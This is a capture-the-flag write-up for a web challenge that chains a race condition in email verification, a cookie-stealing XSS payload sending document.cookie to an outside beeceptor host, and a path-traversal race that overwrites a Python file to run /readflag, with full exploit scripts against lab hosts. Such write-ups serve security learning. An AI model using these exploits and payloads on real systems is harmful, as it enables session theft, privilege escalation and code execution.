# SerialFlow - Insane

In this challenge, participants are provided with a website and the Python source code. 
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/6e67afe8-7c33-473b-b9df-28dcd433d517)


## About the Challenge

There are 2 application, Email application (as an mailbox for test@email.htb) and the challenge itself. 

#### Email Application:
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/60928c94-dae6-4d70-97c7-4fa8f5eb6b6d)


#### Challenge:
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/3ad92a46-3013-4690-ae01-85f1720fa2bd)
After logged in into the challenge:
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/93595a8b-30dc-4015-ba27-11b0397d2d0a)

There is a several roles in the challenge:
1. Unprivileged Users (Normal User)
2. Internal Users (Able to Add New Products)
3. Admin Users (Able to Add New Contracts)

For normal use, we can register with any email but only can be verified with email `test@email.htb` because the email is only sent to the Internal Email Application. Further source code review, we can register to Internal User when the domain email is `apexsurvive.htb` and must verify the account first.

> /challenge/application/database.py
> ```py
> def verifyEmail(token):
>     user = query('SELECT * from users WHERE confirmToken = %s', (token, ), one=True)
> 
>     if user and user['isConfirmed'] == 'unverified':
>         _, hostname = parseaddr(user['unconfirmedEmail'])[1].split('@', 1)
>         
>         if hostname == 'apexsurvive.htb':
>             query('UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail="", confirmToken="", isInternal="true" WHERE id=%s', ('verified', user['unconfirmedEmail'], user['id'],))
>         else:
>             query('UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail="", confirmToken="" WHERE id=%s', ('verified', user['unconfirmedEmail'], user['id'],))
>         
>         mysql.connection.commit()
>         return True
>     
>     return False
> ```

This is not possible hence the verification email is only accessilbe when the email is sent to `test@email.htb`. 

Other identification:
1. Application running in development server and has autoreload features. Declared in `/challenge/uswgi.ini`
   ```ini
   py-autoreload = 3
   ```
3. There is a report item feature that can be used to report the item to Admin check it, typically privilege escalation with XSS challenge.
4. The challenge itself stored the flag in the `/root/flag` or with executable file that can execute in `/readflag`, with this we must get the Code Execution to get the flag.


## Solution

1. Race Condition in Change Email
   When we register to the challenge app and then change the email, the new confirmation email is automatically sent to the new email.
   > /challenge/application/blueprints/api.py
   > ```py
   > @api.route('/profile', methods=['POST'])
    > @isAuthenticated
    > @antiCSRF
    > @sanitizeInput
    > def updateUser(decodedToken):
    >     email = request.form.get('email')
    >     fullName = request.form.get('fullName')
    >     username = request.form.get('username')
    > 
    >     if not email or not fullName or not username:
    >         return response('All fields are required!'), 401
    > 
    >     try:
    >         result = updateProfile(decodedToken.get('id'), email, fullName, username)
    >     except Exception as e:
    >         return response('Why are you trying to break it? Something went wrong!')
    >     
    >     if result:
    >         if result == 'email changed':
    >             sendEmail(decodedToken.get('id'), email)
    >         return response('Profile updated!')
    >     
    >     return response('Email already in used!')
    
   We can race this feature, when the user is successfully changed the email to `test@email.htb` we can assume the database record will be look like this:
   ```
   User ID: 2
   Email: test@email.htb
   Verification Token: abc-def-ghi
   ```
   Then moving forward to the next code, application prepare to send email with `sendEmail(decodedToken.get('id'), email)` function passing `email` = `test@email.htb`. Next, the request is sent that update the Email to `test@apexsurvive.htb` so we can assume the database record will changed like this:
   ```
   User ID: 2
   Email: test@apexsurvive.htb
   Verification Token: jkl-mno-pqr
   ```
   Then, `sendEmail` function query to database for Verification Token WHERE User ID = 2
   > /challenge/application/util.py
   > ```py
   > def sendEmail(userId, to):
    >     token = getToken(userId)
    >     data = generateTemplate(token['confirmToken'], token['unconfirmedEmail'])
    >     
    >     msg = Message(
    >         'Account Verification',
    >         recipients=[to],
    >         body=data,
    >         sender="no-reply@apexsurvive.htb",
    >     )
    >     mail.send(msg)
   > ```
   
   `getToken` function:
   > /challenge/application/database.py
   > ```py
   > def getToken(id):
   >      return query('SELECT unconfirmedEmail, confirmToken FROM users WHERE id=%s', (id, ), one=True)
   > ```
   When `getToken` function is called this query return `test@apexsurvive.htb` verification token due the race, but the email still sent the verification email to `test@email.htb` mailbox.

   Exploit code:
   > exploit.py
   > ```py
   > import aiohttp
    > import asyncio
    > 
    > async def post_request(session, url, cookie, data):
    >     headers = {
    >         'Content-Type': 'application/x-www-form-urlencoded',
    >         'Cookie': cookie
    >     }
    >     async with session.post(url, headers=headers, data=data) as response:
    >         return await response.text()
    > 
    > async def main():
    >     url = 'https://localhost:1337/challenge/api/profile'
    >     cookie = 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwODkxMjEzLCJhbnRpQ1NSRlRva2VuIjoiYWNkZmRmNjAtNDIxMi00ZTNhLWJhYjYtNWFmNjMwZmFjNGUzIn0.yQfFGv0obPz25-RCNUTVsM3PpKUgqjgidhfWw1lYQjA'
    >     # url = "https://83.136.250.12:47676/challenge/api/profile"
    >     # cookie = "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA1MTY4LCJhbnRpQ1NSRlRva2VuIjoiNDZmM2I1ZTUtZWQxMy00ZTZiLTgyOWEtZWJlOWI0NzI4ZmE2In0.2PrzGU6TYBq86pva4rOVPDNIqMBmB35YHg9m3euOQCo"
    > 
    >     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
    >         tasks = []
    >         for char in ["apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "apexsurvive.htb", "email.htb", "apexsurvive.htb"]:  # Number of concurrent requests
    >             data = {
    >                 'email': 'test@' + char,
    >                 'username': 'a',
    >                 'fullName': 'a',
    >                 'antiCSRFToken': 'acdfdf60-4212-4e3a-bab6-5af630fac4e3'
    >             }
    >                     
    >             task = asyncio.ensure_future(post_request(session, url, cookie, data))
    >             tasks.append(task)
    >         
    >         responses = await asyncio.gather(*tasks)
    >         print(responses)
    > 
    > if __name__ == "__main__":
    >     asyncio.run(main())
    > ```
   Run the race condition exploit and check the Email application:
   ```
   ➜ python3 exploit.py 
   ['{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n', '{"message":"Profile updated!"}\n']
   ```

   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/4d738f05-8374-4800-81ba-e9aa168ef6ac)

   Email has been verified:
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/2c3f2095-1769-4faf-9c18-bad98029af12)

   Now our user has been verified with email `test@apexsurvive.htb` and has an access to Add New Products
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/f2c80011-2b13-4a4f-9a58-d32e5cb3f1e0)
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/6c8d0c2c-6661-44bf-8c2f-1902ceb0f314)

2. XSS In Product Manual
   *Notes: This is an unintended solution levearging XSS in the product page*
   In Add New Product, Product Manual is reflected inside `<script>` tag and backtick variable declaration
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/7110d064-5edd-4ce8-8b0c-9681d1d93d2a)
   This can leads to XSS with evaluate the Javascript inside the backtick with this payload `${javascript code here}`. Then we can steal the admin cookie to perform privilege escalation.
   Payload:
   ```
   ${window.location.href='https://h3h3h3.free.beeceptor.com/?q='+document.cookie}
   ```
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/952e751d-b316-4738-90ca-c9b902328a9a)
   Then report the product to admin and get the cookie
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/2080e069-529d-4a31-bd06-0426f089280b)

3. Path Traversal leads to overwrite Python files
   *Notes: This is an unintended solution levearging Race Condition*
   Now we in Admin user, we can Add New Contract with upload a PDF Contract files.
   
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/39812b6b-66f3-4633-88c1-c6d5c7504b80)

   This code below is a source code for upload PDF Contract files:
   > /challenge/application/blueprints/api.py
   > ```py
   > @api.route('/addContract', methods=['POST'])
    > @isAuthenticated
    > @isVerified
    > @isInternal
    > @isAdmin
    > @antiCSRF
    > @sanitizeInput
    > def addContract(decodedToken):
    >     name = request.form.get('name', '')
    > 
    >     uploadedFile = request.files['file']
    > 
    >     if not uploadedFile or not name:
    >         return response('All files required!')
    >     
    >     if uploadedFile.filename == '':
    >         return response('Invalid file!')
    > 
    >     uploadedFile.save('/tmp/temporaryUpload')
    > 
    >     isValidPDF = checkPDF()
    > 
    >     if isValidPDF:
    >         try:
    >             filePath = os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
    >             with open(filePath, 'wb') as wf:
    >                 with open('/tmp/temporaryUpload', 'rb') as fr:
    >                     wf.write(fr.read())
    > 
    >             return response('Contract Added')
    >         except Exception as e:
    >             print(e, file=sys.stdout)
    >             return response('Something went wrong!')
    >     
    >     return response('Invalid PDF! what are you trying to do?')
   > ```
   `os.path.join` is a method that we can exploit to perform Path Traversal with our controlled filename, the vulnerability can is described in picture below:
   ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/b314a5ce-6ce1-440c-a2c7-c3c9ef25d9e7)
   
   The race condition part is, when the valid PDF with name `/hacked` and saved in `/tmp/temporaryUpload`, then continue to check the validity check of PDF, the new request is sent with arbitrary content, this file is overwrited the `/tmp/temporaryUpload`.

   When the check has been finished and passed, the code continue to the writing file:
   1. First `filePath` will be set to `/hacked`
   2. Second read `/tmp/temporaryUpload` file
   3. Third write the read content to destination `filePath` = `/hacked`

    With our controlled `filePath`, this could write the arbitrary content to `/hacked`
  
    Exploit code:
    > overwrite.py
    > ```py
    > from flask import Blueprint, render_template
    > import subprocess
    > 
    > challengeInfo = Blueprint('challengeInfo', __name__)
    > 
    > @challengeInfo.route('/')
    > def info():
    >     return subprocess.check_output(['/readflag'])
    > 
    > ```
  
    > exploit-pdf.py
    > ```py
    > import aiohttp
    > import asyncio
    > 
    > async def post_request(session, url, cookie, data):
    >     headers = {
    >         'Cookie': cookie
    >     }
    >     async with session.post(url, headers=headers, data=data) as response:
    >         return await response.text()
    > 
    > async def main():
    >     # url = 'https://83.136.250.12:47676/challenge/api/addContract'
    >     # cookie = 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZXhwIjoxNzEwMzA1Mzc2LCJhbnRpQ1NSRlRva2VuIjoiMjlhYzEzMzctY2MyMi00ZDNlLThlM2QtNjg1YmM5MmEwZDM1In0.XXmpfm0B4nmkEh5ianHdRRkBLvsmAkq1nFY2u2W1_yU'
    >     
    >     url = "https://localhost:1337/challenge/api/addContract"
    >     cookie = "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZXhwIjoxNzEwODkyMjgxLCJhbnRpQ1NSRlRva2VuIjoiZDA4YjRmM2EtMGZjMy00OTVjLTljYmItZWQ3MDcwNTkxOWJmIn0.R4Dr618tvHsREM9QyFPQg6hmte4DHP8lV4I7BI6QVqo"
    >     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
    >         tasks = []
    >         for filename in ["overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py","overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "sample.pdf", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py", "overwrite.py",  "overwrite.py",  "overwrite.py",  "overwrite.py",  "overwrite.py",  "overwrite.py",  "overwrite.py",  "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py", "overwrite.py"]:  # Number of concurrent requests
    >             data = aiohttp.FormData(quote_fields=False)
    >             f = open(filename, 'rb')
    >             data.add_field('file',
    >                         f.read(),
    >                         filename='/app/application/blueprints/info.py',
    >                         content_type='application/pdf')
    >             # data.add_field("antiCSRFToken", "24a60eea-4f78-4c5a-bb32-92fb68d39032")
    > 
    >             data.add_field("antiCSRFToken", "d08b4f3a-0fc3-495c-9cbb-ed70705919bf")
    >             data.add_field("name", "a")
    > 
    >             f.close()
    >             task = asyncio.ensure_future(post_request(session, url, cookie, data))
    >             tasks.append(task)
    >             
    >             # await asyncio.sleep(0.1)
    >         
    >         responses = await asyncio.gather(*tasks)
    >         print(responses)
    > 
    > if __name__ == "__main__":
    >     asyncio.run(main())
    >   ```
  
